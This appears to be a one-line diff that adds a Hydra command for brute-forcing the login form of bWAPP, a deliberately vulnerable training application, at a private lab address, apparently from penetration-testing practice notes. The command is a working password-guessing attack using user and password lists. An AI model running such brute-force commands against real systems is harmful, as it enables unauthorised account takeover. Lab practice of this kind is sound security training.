@@ -1,0 +1,1 @@
+hydra -L users.txt -P passwords.txt -v -V 192.168.56.11 http-post-form "/bwapp/ba_weak_pwd.php:login=^USER^&password=^PASS^&action=login:F=Username and/or password incorrect"
